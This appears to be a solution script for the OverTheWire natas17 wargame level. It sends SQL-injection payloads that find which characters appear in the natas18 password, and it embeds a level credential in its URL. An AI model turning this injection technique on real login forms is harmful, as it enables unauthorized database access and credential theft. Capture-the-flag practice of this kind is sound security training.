import requests

URL = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
s = requests.Session()
answer = ''

for ch in alphabet:
   data = {'username':'natas18" and password LIKE BINARY "%'+ch+'%" -- '}
   r = s.post(URL, data=data)
   if 'This user exists' in r.text:
       #print(ch)
       answer = answer+ch

print(answer)
